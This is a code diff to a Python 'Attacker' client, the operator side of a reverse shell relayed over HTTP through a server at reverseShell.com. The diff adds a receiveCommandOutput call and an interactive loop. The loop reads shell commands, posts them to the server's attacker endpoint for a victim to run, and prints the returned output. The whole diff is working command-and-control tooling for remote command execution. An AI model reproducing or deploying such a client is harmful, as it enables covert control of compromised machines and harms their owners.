@@ -3,6 +3,7 @@ import logging
 import pickle
 
 class Attacker:
+    DEBUG = True
 
     # Try to load session cookies from file
     def __tryToLoadSessionCookies(self):
@@ -54,49 +55,80 @@ class Attacker:
                     self.__serverUrl + '/attacker/sendCommand.php',
                     data={'command':command})
 
+    def receiveCommandOutput(self):
+        return self.__session.request('GET',
+                    self.__serverUrl + '/attacker/receiveCommandOutput.php')
+
+
     def disconnectFromVictim(self):
         pass
 
     def disconnectFromServer(self):
         return self.__session.request('GET', self.__serverUrl + '/login.php', headers={'Connection':'close'})
 
-
+# Print message if debug flag is set
+def printDebug(message, end='\n'):
+    if(Attacker.DEBUG):
+        print(message, end=end)
 
 # Print response object
-def printResponse(response):
-    print(response.text, end='')
+#def printResponse(response):
+    #print(response.text, end='')
 
 def main():
     # Module for connection debugging
     logging.basicConfig(level=logging.DEBUG)
-
     # Server domain
     baseUrl = 'http://www.reverseShell.com'
-
     # Store command
-    data = {'cmd': None}
+    data = {'cmd': None, 'output': None}
 
+    # Login
     attacker = Attacker()
-    print('Requesting login...')
-    printResponse(attacker.connectToServer(baseUrl))
+    printDebug('Requesting login...')
+    printDebug(attacker.connectToServer(baseUrl).text)
+    '''
     #print('Listing victims...')
     #victimsList = attacker.listVictims()
     #printResponse(victimsList)
     #attacker.connectToVictim(victimsList[0])
     printResponse(attacker.sendCommand('ls'))
+    printResponse(attacker.receiveCommandOutput())
     #print(output)
     #attacker.disconnectFromVictim()
     printResponse(attacker.disconnectFromServer())
     #printResponse(requests.request('GET', baseUrl + '/modules/sessionManager.php'))
+    '''
+    try:
+        while True:
+            # Get command
+            data['cmd'] = input()
+
+            # Send command
+            printDebug('Sending command...')
+            printDebug(attacker.sendCommand(data['cmd']).text)
+
+            # Get output
+            printDebug('Receiving output...')
+            data['output'] = attacker.receiveCommandOutput().text
+            print(data['output'], end='')
+
+            #printResponse(attacker.receiveCommandOutput())
+
+    # If hit Ctrl+c
+    except KeyboardInterrupt:
+        raise SystemExit
+    finally:
+        printDebug(attacker.disconnectFromServer().text)
 
 
+    '''
     #print(s.cookies.get_dict())
     #print(response.content)
     #print(response.text)
 
     exit()
 
-    '''
         while True:
             try:
                 # Read command
